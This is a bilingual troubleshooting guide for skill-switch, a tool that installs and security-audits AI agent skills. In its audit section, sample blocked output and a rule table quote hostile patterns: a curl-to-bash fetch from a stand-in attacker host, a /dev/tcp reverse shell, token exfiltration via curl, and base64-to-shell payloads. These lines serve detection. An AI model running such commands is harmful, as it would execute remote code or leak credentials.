# Troubleshooting

常见问题与解决方法 | Common Problems & Fixes

---

## 1. macOS Gatekeeper 弹出「下载自互联网」提示

**症状 / Symptom**

首次双击打开 `skill-switch.app` 时，系统弹出「"skill-switch" 是从互联网下载的应用，你确定要打开它吗？」对话框。

**原因 / Cause**

macOS 会隔离从网络下载的应用。仓库的自动 tag workflow 当前上传的是**未签名预览 zip**，因此 Gatekeeper 可能拦截；只有 Release 里明确附带签名、公证与校验记录的人工产物，才能视为 Developer ID / Notarization 版本。

**怎么办 / Fix**

先确认产物来源与 Release 校验记录。对于可信的未签名预览构建，可在“系统设置 → 隐私与安全性”中查看并人工决定是否打开；不要用递归移除 quarantine 或全局关闭 Gatekeeper 的命令绕过系统保护。若产物宣称已签名，可先运行：

```bash
codesign --verify --deep --strict --verbose=2 /path/to/skill-switch.app
spctl --assess --type execute --verbose=2 /path/to/skill-switch.app
```

验证失败应停止使用并回到 Release 页面核对，而不是假定文件只是“下载损坏”。

---

## 2. `skill-switch` 命令未找到 / CLI 不在 PATH

**症状 / Symptom**

在终端输入 `skill-switch` 出现 `command not found`。

**原因 / Cause**

源码构建的 App 会内置 CLI，路径为 `/Applications/skill-switch.app/Contents/Resources/skill-switch-cli`；npm 安装则把 `skill-switch` bin 放入 npm 的全局或项目 bin 目录。两者都可能因为对应目录不在 `PATH` 中而找不到。

**怎么办 / Fix**

若确实安装了 App，可创建符号链接（Apple Silicon Homebrew 用户也可选择 `/opt/homebrew/bin`）：

```bash
ln -sf /Applications/skill-switch.app/Contents/Resources/skill-switch-cli /usr/local/bin/skill-switch
```

链接后验证：

```bash
skill-switch --help
```

如果从源码工作，可用：

```bash
pnpm cli --help
```

> **沙箱测试小贴士**：对任何命令加 `--home <某个空目录>` 就可以在临时目录里安全试验，完全不碰真实配置。

---

## 3. 安装被 audit 拦下 / `install` 返回 BLOCKED

**症状 / Symptom**

运行 `skill-switch install <来源>` 或在 GUI 里点「安装」后，出现类似以下提示：

```
blocked: my-skill  score: 45/100  verdict: DANGER
  [HIGH] reverse-shell  SKILL.md:12
    > curl http://evil.example.com/payload | bash
```

**原因 / Cause**

安装前的安全体检（audit）发现高风险模式、评分低于 70，或者无法证明扫描覆盖完整。过大、过深、文件过多、不可读、嵌套符号链接或无法分类的可执行文件都会 fail closed。常见命中原因包括：

| 规则类型 | 示例 |
|---|---|
| reverse-shell | `bash -i >& /dev/tcp/...` |
| exfiltration | `curl ... -d "$GITHUB_TOKEN"` |
| credential-theft | 要求用户粘贴 API key 的指令 |
| base64-payload | `base64 -d \| sh` 模式 |
| prompt-injection | SKILL.md 中嵌入隐藏指令 |

**怎么办 / Fix**

**推荐做法**：先仔细阅读拦截报告，确认命中内容是否是误报或已知无害的代码，再决定是否继续。

如果你完全信任该来源并确认报告是误报，可以带 `--force` 强制安装，并在 `--force-reason` 里记录原因（此记录会落盘，doctor 命令会显示）：

```bash
skill-switch install ./my-skill --agent claude-code --force --force-reason "内部工具，curl 调用是内网 API，已审查"
```

在 GUI 里：安装界面勾选**「遇到拦截也继续」**，并在弹出的理由框中填写说明。

> **注意**：`--force` 不会绕过体检本身，体检仍然运行并记录结果；只是不再阻断安装流程。bypass 记录可用 `doctor` 查看。

---

## 4. `doctor` 报告漂移 / 三方不一致

**症状 / Symptom**

运行 `skill-switch doctor` 出现类似以下输出：

```
finding: missing  claude-code / tidy-notes
finding: content-drift  claude-code / smart-commit
finding: stale-lock  codex / format-code
finding: extra-locked  claude-code / old-helper
```

**原因 / Fix（按漂移类型）**

**`missing`：声明里有，磁盘上没有**

你在 `skills.json` 里声明了这个 skill 为 `enabled: true`，但对应工具的 skills 目录里找不到它。最常见的原因是手动删除了磁盘上的 skill 目录，或者声明是从另一台机器导入的但还没执行安装。

修复：
```bash
skill-switch sync  # 按声明重新铺设
```

**`content-drift`：磁盘内容与 lock 不一致**

磁盘上的 skill 文件夹的内容哈希和 `skills.lock.json` 里记录的不一样——说明有人（或某个工具）直接修改了磁盘上的文件，绕过了 skill-switch 的管理。

修复方案有两种：
- 如果磁盘版本才是你想要的：`skill-switch install <来源路径> --agent <工具>` 重新安装（会更新 lock 里的哈希）。
- 如果想恢复到 lock 里记录的状态：`skill-switch sync` 从 store 里覆盖回去（仅 copy 模式有 store 副本）；或 `skill-switch restore --latest` 从快照还原。

**`stale-lock`：磁盘有，但 lock 里没有记录**

该 skill 存在于磁盘但 `skills.lock.json` 里没有对应条目——通常是直接把 skill 复制进 agent 目录而没有走 `skill-switch install` 流程。

修复：
```bash
skill-switch install <该 skill 的来源路径> --agent <工具>  # 补录 lock
```

**`extra-locked`：lock 里有，但声明里没有**

`skills.lock.json` 里存在某条目，但 `skills.json` 声明里完全找不到该 skill。这是「孤儿锁」，通常是手动编辑了声明，或者通过其他方式删除了声明但未清理 lock。

修复：
```bash
skill-switch remove <skill名> --agent <工具>  # 一致性拆除
```

---

## 5. 备份在哪里 / 如何还原

**症状 / Symptom**

执行了删除或同步操作后想撤销，或想知道备份保存在哪里。

**原因 / Cause**

高影响写操作会对受影响的 agent skill 目录拍 `tar.gz` 快照，保存到 `~/.skill-switch/backups/`；权威 JSON 状态文件使用原子替换，协作写操作由 home 级锁串行化，并在已知错误上尽力补偿。但这不是跨多个文件/目录的 ACID 事务，旧快照也不包含每个 `.skill-switch` 状态文件。进程在多文件更新中被 `SIGKILL` 或机器掉电时，仍可能需要人工核对声明、lock、store 与 agent 目录。

**怎么办 / Fix**

列出所有备份：
```bash
skill-switch restore
```

还原最新的一份快照：
```bash
skill-switch restore --latest
```

还原指定快照（用列表里显示的 ID，即时间戳数字）：
```bash
skill-switch restore --id 1718000000000
```

还原前会拍一份「pre-restore」快照，便于撤回 agent 目录层面的还原。还原后应执行 `doctor` 与 `lock --verify`，不要把快照还原等同于整个治理状态的时间点恢复。

在 GUI 里：顶部「安装与维护」→「查看备份」，选中一条后点**「还原」**。

---

## 6. `audit --configs` 标记了 settings.json 或 MCP 配置

**症状 / Symptom**

运行 `skill-switch audit --configs` 后，输出里出现关于 `~/.claude/settings.json`、`~/.claude/mcp.json` 或 `~/.claude/claude_desktop_config.json` 的告警，例如：

```
.claude/settings.json: 1 finding(s)
  [HIGH] mcp/env-literal-github-token  .claude/settings.json:8
    > env.GITHUB_TOKEN=<redacted>
```

**原因 / Cause**

`audit --configs` 会额外扫描这几个 agent 配置文件：

| 文件 | 扫描内容 |
|---|---|
| `.claude/settings.json` | 明文硬编码的 API key、token 等敏感值 |
| `.claude/settings.local.json` | 同上 |
| `.claude/claude_desktop_config.json` | MCP server 命令中的危险模式（curl\|sh、反弹 shell、未锁版本的 npx/uvx） |
| `.claude/mcp.json` | 同上 |

这些告警**不会拦截 skill 安装**（configs 体检只是额外报告），但高严重度告警值得认真对待。

**怎么办 / Fix**

- 如果是 API key/token 被硬编码：把明文 secret 改为环境变量引用，例如用 `$GITHUB_TOKEN` 而不是直接粘贴 token 值。
- 如果是 MCP server 有 `curl | sh` 等模式：检查来源是否可信；如果必须使用，建议固定版本号或更换为更安全的启动方式。
- 如果是 `npx some-package`（无版本号）：改为 `npx some-package@1.2.3` 锁定版本，降低供应链风险。

---

## 7. 如何完整卸载 skill-switch

**症状 / Symptom**

想彻底移除 skill-switch，恢复到安装前的状态。

**原因 / Cause**

skill-switch 的足迹包括：App（`/Applications/skill-switch.app`）、数据目录（`~/.skill-switch`，含声明、lock、store 和备份）、以及 PATH 上的 CLI 软链。

**怎么办 / Fix**

一条命令完整卸载（会列出计划，确认后执行）：

```bash
skill-switch uninstall
```

跳过确认提示直接执行：
```bash
skill-switch uninstall --yes
```

**默认行为**：卸载 App 和 `~/.skill-switch` 数据目录，以及 PATH 上指向 skill-switch 的软链。**各工具已安装的 skill 文件不会被删除**——它们继续可用。

如果同时想删除已安装到各工具的 skill：
```bash
skill-switch uninstall --purge-skills
```
（会对每个 skill 先拍快照，再拆除）

先预演一遍（不真删）：
```bash
skill-switch uninstall --dry-run
```

**手动兜底**（如果 App 已经删了但 CLI 还能用，或者上面命令执行失败）：
```bash
rm -rf /Applications/skill-switch.app
rm -rf ~/.skill-switch
rm /usr/local/bin/skill-switch   # 若你创建了软链
```

---

## 8. 提示另一个操作正在进行 / operation lock 超时

**症状**

写命令提示 home 状态被其他进程占用，或等待后超时。

**处理**

1. 检查是否还有另一个 `skill-switch` CLI 或 GUI 操作在运行，等待它完成。
2. 不要在有活跃写进程时手工删除锁目录；锁内包含 PID 和随机 nonce，用来避免误删后来者的锁。
3. 进程已经死亡时，下一个写操作会回收陈旧锁。若仍失败，保留错误与 `~/.skill-switch` 目录清单用于排查。
4. 操作恢复后运行：

```bash
skill-switch doctor
skill-switch lock --verify
```

锁只协调使用同一协议的 skill-switch 进程；直接编辑文件或第三方程序不会自动受它保护。

---

## 9. audit 报告 `coverage.complete=false`

这不是普通规则误报，而是“扫描没有覆盖完整输入”。先查看 human/JSON 输出里的 `coverage.incompleteReasons`，再针对原因处理：缩小无关大目录、修复权限、移除嵌套 symlink、减少深度/文件数，或把未知二进制改为可审计的源码/显式允许的资产。重新运行后必须看到 `coverage.complete=true`，才说明 SAFE 结论覆盖了完整候选内容。

`--force` 可以在明确知情时继续安装，但不会把不完整审计变完整；理由和覆盖缺口会进入 bypass 记录供后续审查。

---

## 10. 最小化故障证据

提交问题前，优先在一次性 home 中复现，并附上不含密钥的机器可读结果：

```bash
tmp_home="$(mktemp -d)"
skill-switch status --home "$tmp_home"
skill-switch audit /path/to/reproducer --format json --home "$tmp_home" > audit.json
skill-switch doctor --json --home "$tmp_home" > doctor.json
```

删除或遮盖用户名、绝对路径、环境变量值、header 和 token。不要上传真实 transcript、`settings.json`、`.env`、`skills.lock.json` 中的私有来源 URL，或整个 `~/.skill-switch` 目录。
